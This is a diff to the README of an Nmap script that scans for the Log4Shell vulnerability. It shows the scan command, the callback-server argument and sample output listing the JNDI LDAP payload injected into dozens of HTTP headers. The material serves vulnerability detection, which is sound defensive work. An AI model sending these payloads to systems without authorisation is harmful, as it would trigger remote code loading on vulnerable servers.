@@ -58,7 +58,7 @@ See the target IP address in netcat (or ncat) output:
 
 ### Output
 
-    nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:389 -p 8080 172.17.42.1 
+    nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:1389 -p 8080 172.17.42.1 
     Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-13 21:26 CET
     Nmap scan report for 172.17.42.1
     Host is up (0.000096s latency).
@@ -66,82 +66,53 @@ See the target IP address in netcat (or ncat) output:
     PORT     STATE SERVICE
     8080/tcp open  http-proxy
     | log4shell: 
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using X-Api-Version header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using User-Agent header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Cookie header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Referer header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Accept-Language header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Accept-Encoding header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Upgrade-Insecure-Requests header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Accept header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using upgrade-insecure-requests header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Origin header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Pragma header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using X-Requested-With header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using X-CSRF-Token header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Dnt header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Content-Length header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Access-Control-Request-Method header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Access-Control-Request-Headers header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Warning header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Authorization header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using TE header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Accept-Charset header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Accept-Datetime header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Date header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Expect header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Forwarded header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using From header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Max-Forwards header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Proxy-Authorization header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Range, header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Content-Disposition header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Content-Encoding header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using X-Amz-Target header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using X-Amz-Date header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Content-Type header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Username header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using IP header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using IPaddress header.
-    |   For confirmation see 172.17.42.1:389 server log
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Hostname header.
-    |_  For confirmation see 172.17.42.1:389 server log
+    |   (!) Sended payload ${jndi:ldap://172.17.42.1:1389/log4shell/127.0.0.1/8080} using HTTP headers:
+    |   
+    |    - X-Api-Version (200)
+    |    - User-Agent (200)
+    |    - Cookie (200)
+    |    - Referer (200)
+    |    - Accept-Language (200)
+    |    - Accept-Encoding (200)
+    |    - Upgrade-Insecure-Requests (200)
+    |    - Accept (200)
+    |    - upgrade-insecure-requests (200)
+    |    - Origin (200)
+    |    - Pragma (200)
+    |    - X-Requested-With (200)
+    |    - X-CSRF-Token (200)
+    |    - Dnt (200)
+    |    - Content-Length (200)
+    |    - Access-Control-Request-Method (200)
+    |    - Access-Control-Request-Headers (200)
+    |    - Warning (200)
+    |    - Authorization (200)
+    |    - TE (200)
+    |    - Accept-Charset (200)
+    |    - Accept-Datetime (200)
+    |    - Date (200)
+    |    - Expect (200)
+    |    - Forwarded (200)
+    |    - From (200)
+    |    - Max-Forwards (200)
+    |    - Proxy-Authorization (200)
+    |    - Range, (200)
+    |    - Content-Disposition (200)
+    |    - Content-Encoding (200)
+    |    - X-Amz-Target (200)
+    |    - X-Amz-Date (200)
+    |    - Content-Type (200)
+    |    - Username (200)
+    |    - IP (200)
+    |    - IPaddress (200)
+    |    - Hostname (200)
+    |   
+    |_  Inspect the callback server (172.17.42.1:1389) or web-application (127.0.0.1:8080) logs
+
+#### Arguments
+
+- `log4shell.callback-server`: The callback server (eg. `172.17.42.1:1389`)
+- `log4shell.http-headers`: Comma-separated list of HTTP headers (eg. `X-Api-Version.User-Agent,Referer`)
 
 
 # Legal Disclaimer
